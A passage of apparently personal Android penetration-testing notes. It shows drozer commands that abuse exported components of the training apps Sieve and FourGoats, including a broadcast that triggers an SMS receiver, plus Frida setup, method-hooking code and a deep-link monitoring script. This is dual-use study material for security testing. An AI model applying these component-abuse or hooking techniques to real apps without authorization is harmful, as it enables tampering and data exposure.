</p><p id="324fb2d7-5279-4f99-a96f-ade11ebeda88" class=""><mark class="highlight-blue"><strong>Interacting with Services</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="54ea877a-cbea-461e-8cd9-157f16b87e2f" class="code"><code class="language-JavaScript">dz&gt; run app.service.info -a com.mwr.example.sieve
</code></pre><p id="c5804440-c8b5-4075-bf14-14a85d95e6cb" class="">
</p><p id="6ec07004-934d-4ffa-baaf-e95f63592fc4" class=""><mark class="highlight-blue"><strong>Unintended Data Leakage</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0da80a71-503d-425b-8aa7-4a00ddc60709" class="code"><code class="language-JavaScript">$ pidcat com.mwr.example.sieve</code></pre><p id="d88e87b8-8b61-4762-a267-63f1a7a367ea" class="">
</p><p id="2e43e01b-ff56-4745-a13e-e3c2f12451d4" class=""><mark class="highlight-blue"><strong>Attacking Services</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19caeba6-5704-4828-8a3e-14c1b3843892" class="code"><code class="language-JavaScript">dz&gt; run app.service.info --package org.owasp.goatdroid.fourgoats
Package: org.owasp.goatdroid.fourgoats
  org.owasp.goatdroid.fourgoats.services.LocationService
    Permission: null</code></pre><p id="4154d9bd-5f09-462b-8614-40ed1badf2a1" class="">
</p><p id="b548efa1-ff57-4235-81af-117dbaa3fe77" class=""><mark class="highlight-blue"><strong>Attacking Activities</strong></mark><br/>The components listed in the AndroidManifest.xml file<br/></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f0407db2-a40b-47a3-95ca-7a5d94f77166" class="code"><code class="language-JavaScript">dz&gt;  org.owasp.goatdroid.fourgoats -u
Package: org.owasp.goatdroid.fourgoats
  Exported Activities:
    org.owasp.goatdroid.fourgoats.activities.Main</code></pre><p id="e6dd4c3d-0350-4bfa-9f75-bfbdbedf32fb" class="">
</p><p id="f97b6292-1f4d-4bef-a80c-29c5075f7e5b" class=""><mark class="highlight-blue"><strong>Activate the component</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f1c06ab1-7986-45f8-a443-c4ddc2d72611" class="code"><code class="language-JavaScript">dz&gt; run app.activity.start --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.activities.ViewProfile
</code></pre><p id="a1ab968b-1da1-444d-b842-fd0fbd05e1cb" class="">
</p><p id="99331856-e6ad-451f-9496-953d44050162" class=""><mark class="highlight-blue"><strong>Attacking Broadcast Receivers</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="33aa45e2-1c34-4512-bb34-bae219537b3e" class="code"><code class="language-JavaScript">dz&gt; run app.broadcast.info --package org.owasp.goatdroid.fourgoats
Package: org.owasp.goatdroid.fourgoats
  org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver
    Permission: null</code></pre><p id="0c657cf5-53a9-41db-a099-6ea5b898fb95" class="">If you would see in the AndroidManifest.xml file of FourGoats application then you will find action name is org.owasp.goatdroid.fourgoats.SOCIAL_SMS and component name as org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver . So we have to set these parameters in drozer accordingly.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="56393bef-cf65-4138-9362-b824c2ecc205" class="code"><code class="language-JavaScript">dz&gt; run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver --extra string phoneNumber 1234 --extra string message &quot;it&#x27;s test&quot;
</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><mark class="highlight-blue">S</mark><mark class="highlight-blue"><strong>tart Drozer in Docker</strong></mark></summary><div class="indented"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ceb73e6e-3ba5-46f2-bc54-6840924ee77e" class="code"><code class="language-Bash">adb kill-server
adb -a nodaemon server start</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bcb1462a-5313-4141-89ad-c374cc0c43c1" class="code"><code class="language-Bash">adb connect 192.168.1.8:62001 # mobile ip</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="560d8af5-8e8c-4f22-8be8-62830e191413" class="code"><code class="language-Bash">adb forward tcp:31415 tcp:31415</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="45ac737c-4d48-4a14-9bd1-24241079fd99" class="code"><code class="language-Bash">docker run -it fsecurelabs/drozer</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0bf98a4d-dc37-485b-91b7-1744fc29e04c" class="code"><code class="language-Bash">drozer console connect --server 192.168.1.5:31415 #IP kali</code></pre></div></details></li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Frida</summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Intro</summary><div class="indented"><figure id="3d3f47b9-48b1-4d1f-bbf3-8ba70f7aee76"><a href="https://frida.re/docs/javascript-api/" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">JavaScript API</div><div class="bookmark-description">Observe and reprogram running programs on Windows, macOS, GNU/Linux, iOS, watchOS, tvOS, Android, FreeBSD, and QNX</div></div><div class="bookmark-href"><img src="https://frida.re/favicon.ico" class="icon bookmark-icon"/>https://frida.re/docs/javascript-api/</div></div></a></figure><ul id="f87c1054-152d-4226-9b98-28d07d5d719f" class="bulleted-list"><li style="list-style-type:disc">Is a powerful<mark class="highlight-pink"> open-source dynamic instrumentation toolkit </mark>that is used for a variety of security-related tasks, including <mark class="highlight-pink">analyzing </mark>and <mark class="highlight-pink">testing </mark>Android applications.</li></ul><ul id="03a55f03-ea2a-466e-9a29-f25c1fff2279" class="bulleted-list"><li style="list-style-type:disc">Allows to<mark class="highlight-pink"> inject code into running processes</mark>, including Android apps, to <span style="border-bottom:0.05em solid">monitor</span> their behavior, <span style="border-bottom:0.05em solid">manipulate </span>their runtime execution, and <span style="border-bottom:0.05em solid">analyze </span>their security vulnerabilities.</li></ul><p id="2a8bda4e-43cb-44af-9ad7-9f3d6215662d" class=""><em><strong>Frida provides</strong></em></p><ol type="1" id="b2fb6b30-14a5-4daa-ad51-68288713eae5" class="numbered-list" start="1"><li><em><span style="border-bottom:0.05em solid"><mark class="highlight-pink"><strong>Code Injection</strong></mark></span></em><strong>:</strong> into the target application&#x27;s runtime. This can be used to intercept function calls, modify behavior, or gather information for analysis.</li></ol><ol type="1" id="62f875b8-ed04-4f46-b01e-333d1b35480a" class="numbered-list" start="2"><li><em><span style="border-bottom:0.05em solid"><mark class="highlight-pink"><strong>Runtime Analysis</strong></mark></span></em><strong>:</strong> to monitor the runtime behavior of an application, including tracking API calls, data flows, and interactions with the system.</li></ol><ol type="1" id="39e45731-4f5c-4c37-bb71-734a2749777f" class="numbered-list" start="3"><li><em><span style="border-bottom:0.05em solid"><mark class="highlight-pink"><strong>Dynamic Hooking</strong></mark></span></em><strong>:</strong> into specific functions or methods within an app to intercept and modify their behavior, which is useful for security analysis and testing.</li></ol><ol type="1" id="a99f7e25-398f-4d58-9984-0ab175af0670" class="numbered-list" start="4"><li><em><span style="border-bottom:0.05em solid"><mark class="highlight-pink"><strong>SSL Pinning Bypass</strong></mark></span></em><strong>:</strong> bypass SSL certificate pinning, which is a security mechanism used by apps to ensure that they communicate with trusted servers. This is often done to analyze app-server communications for vulnerabilities.</li></ol><ol type="1" id="9d0d76c1-a861-4f0d-922f-dc0cec0e16fe" class="numbered-list" start="5"><li><em><span style="border-bottom:0.05em solid"><mark class="highlight-pink"><strong>Reverse Engineering</strong></mark></span></em><strong>:</strong> by providing insights into code execution, memory manipulation, and more.</li></ol><ol type="1" id="d959380f-dbb4-4bf9-929f-f5446f7fb0bf" class="numbered-list" start="6"><li><em><span style="border-bottom:0.05em solid"><mark class="highlight-pink"><strong>Behavior Monitoring</strong></mark></span></em><strong>:</strong> By injecting Frida scripts, you can observe an app&#x27;s runtime behavior and interactions, helping you identify potential security flaws or vulnerabilities.</li></ol><ul id="6fdf70ef-2918-4911-afc8-9dce1b61248f" class="toggle"><li><details open=""><summary><strong><mark class="highlight-blue">Frida Moods</mark></strong></summary><p id="571721dd-7cf9-433e-99b5-c9609eb2d02b" class="">1- Injected mood → we put Frida server on the device in order to<mark class="highlight-yellow"> spawn or attach Frida script on a running process</mark> in an app. In this mood, the device should be <mark class="highlight-yellow">rooted.</mark></p><p id="2119cca4-13aa-4d68-98c4-90720e8f9707" class="">2- Embedded mood → use a component called <mark class="highlight-yellow">Frida-gadget </mark>instead of Frida server. We use it when we want to run the app on a <mark class="highlight-yellow">non-rooted device.</mark></p></details></li></ul><p id="9ef685d9-0abe-438b-b7e0-52596b808a03" class="">To use Frida for Android penetration testing, you typically write Frida scripts in JavaScript that define the injections and hooks you want to apply to the target application. Frida works with both rooted and non-rooted devices and supports various modes of interaction.</p><figure id="c01bfcb7-eae6-42f6-b9a0-2dfff9767296" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2067.png"><img style="width:285px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2067.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="457c4983-d24b-4f01-a8b9-a7756ba32c57" class="code"><code class="language-JavaScript">adb push ~/Downloads/frida-server-16.1.3-android-x86.xz  /data/local/tmp/</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">hooking</summary><div class="indented"><p id="3aee621a-ede3-4739-946d-a3a3c2a54ca1" class=""><mark class="highlight-red"><em><span style="border-bottom:0.05em solid"><strong>#Pending trial:</strong></span></em></mark></p><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="46b9dcfb-8a56-4ecd-95bf-7d5b29823706"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">To compose the <mark class="highlight-purple">.js </mark>file we can use <mark class="highlight-blue">jadx-gui</mark> ⇒ right clicking the class and select Copy as Frida snippet(f):</div></figure><figure id="92815b68-05ba-4e39-ad8e-3a602ad5dbd5" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2068.png"><img style="width:288px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2068.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="adc126d8-f7b7-4dd9-8d5d-aa460f5dc47f" class="code"><code class="language-JavaScript">let MainActivity = Java.use(&quot;infosecadventures.allsafe.MainActivity&quot;);
MainActivity[&quot;onBackPressed&quot;].implementation = function () { //we can pass any params in (x,y,...)
    console.log(`MainActivity.onBackPressed is called`);
    this[&quot;onBackPressed&quot;]();
//We can then add the return value we want
};</code></pre><hr id="310d0eb1-a6b4-45df-b2c6-8acaa8065a97"/><p id="410b46d9-ddeb-4752-82b6-0921522f3816" class="">Here’s an example to intercept activity in APK and over write a function named fun </p><figure id="0157c1e2-3aa5-4174-ad8e-92dca2106eaf" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2069.png"><img style="width:384px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2069.png"/></a></figure><figure id="13bf896c-3ce5-4e15-aac6-970a1020d2f5" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2070.png"><img style="width:384px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2070.png"/></a></figure><figure id="5249c921-f5cb-4900-89dd-d868840bfb15" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2071.png"><img style="width:384px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2071.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f97f4271-5734-4ee9-bbbf-c2f1c00931c1" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">frida -U -l hook.js -f com.example.a11x256.frida_test --no-pause #lateset version run with no-pause by default</code></pre><p id="4a8946dd-4044-4222-aa2b-4adc22b108a1" class="">in case of over writing a string we have two methods</p><p id="5700f668-35f3-404e-8951-c824965fc110" class="">1 ⇒ not the best but it would work in this case</p><figure id="2d794cb6-9765-4090-a63c-eaa335ea49e1" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2072.png"><img style="width:432px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2072.png"/></a></figure><figure id="36487016-2949-4868-8c1b-6f67f8c76091" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2073.png"><img style="width:432px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2073.png"/></a></figure><p id="55ae9a38-037f-4593-b395-6bd7019edf82" class="">2 ⇒ The prober way to do it</p><figure id="38104871-641e-4bf5-80b8-8fd12dd9ea43" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2074.png"><img style="width:432px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2074.png"/></a></figure><p id="3b6bb94a-ecc4-4ee1-bb6b-dbed5042457b" class="">Now lets deal with the function that is not called in the entire APK ⇒ <mark class="highlight-pink">secret()</mark></p><figure id="c99a67d2-9df9-44dd-a87c-7405fe8aa9fc" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2075.png"><img style="width:432px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2075.png"/></a></figure><p id="fb50eed1-ab4a-47e2-b224-7ad98f2c4730" class=""><code>adb install apk2.APK</code></p><p id="f6e341fc-1e10-4499-99e8-f31e7a804668" class="">to run using python script :</p><figure id="3feb5da3-a799-4eaa-b5f2-46becb08ea8e" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2076.png"><img style="width:432px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2076.png"/></a></figure><figure id="f4f184fa-0ee7-4481-800c-782922ded914" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2077.png"><img style="width:432px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2077.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6b07f5e0-b16c-4830-b06d-9ad36b60c3e1" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">python3 hook.py</code></pre><p id="49f57d5c-fc58-4e23-8462-60bce000c129" class=""><code>frida -U -l hook.js -f owasp.mstg.uncrackable1</code></p><hr id="85ff7f5c-87f3-476a-8791-cc7a526b862f"/><p id="a5a21caa-560d-4a0e-8837-cfa3eed99e93" class=""><strong>Use Frida to hook PID of any service in Kali, for example to monitor any Deep-links coming out from the APK</strong></p><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><strong>Monitoring Deep Links Across The Operating System</strong></summary><div class="indented"><p id="fb83c288-01b1-45cd-9924-e836843766d6" class="">When working with custom OEMs and complex applications, it’s necessary to monitor the usage of deep links. This is important to ensure that the custom OEMs are working properly and have proper validation, and to identify any hidden deep links that may cause security issues.</p><p id="d4641bc5-bb99-4ca6-af9f-36e7592270db" class="">An example of such an issue can be seen in this article: <a href="https://ssd-disclosure.com/ssd-advisory-galaxy-store-applications-installation-launching-without-user-interaction/">https://ssd-disclosure.com/ssd-advisory-galaxy-store-applications-installation-launching-without-user-interaction/</a></p><p id="a2776a9c-1ffd-478e-a41d-1854252fb2b3" class="">For monitoring deep links across the system here we will use frida framework. To install the frida server and agent we can refer to the frida documentation here <a href="https://frida.re/docs/android/">https://frida.re/docs/android/</a>, or take a look at using FridaLoader (<a href="https://github.com/dineshshetty/FridaLoader">https://github.com/dineshshetty/FridaLoader</a>) that automates the process for us.</p><p id="b1a296d7-b54e-4308-817e-fd40eae50095" class="">After setting up the necessary components, we can utilize the enhanced version of a publicly available version – modified to handle intensive operations.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d415359e-7d05-4270-9749-8404702bf34b" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">//Modified version of &lt;https://codeshare.frida.re/@leolashkevych/android-deep-link-observer/&gt;
//frida -U -p pid -l script.js
// Define a global object to store previously seen intents
var seenIntents = {};
Java.perform(function() {
    var Intent = Java.use(&quot;android.content.Intent&quot;);
    Intent.getData.implementation = function() {
        var action = this.getAction() !== null ? this.getAction().toString() : false;
        if (action) {
            // Create a unique key for the current intent by concatenating its action and data URI
            var key = action + &#x27;|&#x27; + (this.getData() !== null ? this.getData().toString() : &#x27;&#x27;);
            // Check if this intent has been seen before
            if (seenIntents.hasOwnProperty(key)) {
                return this.getData();
            } else {
                // Mark this intent as seen by adding it to the global object
                seenIntents[key] = true;
                console.log(&quot;[*] Intent.getData() was called&quot;);
                console.log(&quot;[*] Activity: &quot; + (this.getComponent() !== null ? this.getComponent().getClassName() : &quot;unknown&quot;));
                console.log(&quot;[*] Action: &quot; + action);
                var uri = this.getData();
                if (uri !== null) {
                    console.log(&quot;\\n[*] Data&quot;);
                    uri.getScheme() &amp;&amp; console.log(&quot;- Scheme:\\t&quot; + uri.getScheme() + &quot;://&quot;);
                    uri.getHost() &amp;&amp; console.log(&quot;- Host:\\t\\t/&quot; + uri.getHost());
                    uri.getQuery() &amp;&amp; console.log(&quot;- Params:\\t&quot; + uri.getQuery());
                    uri.getFragment() &amp;&amp; console.log(&quot;- Fragment:\\t&quot; + uri.getFragment());
                    console.log(&quot;\\n\\n&quot;);
                } else {
                    console.log(&quot;[-] No data supplied.&quot;);
                }
            }
        }
        return this.getData();
    }
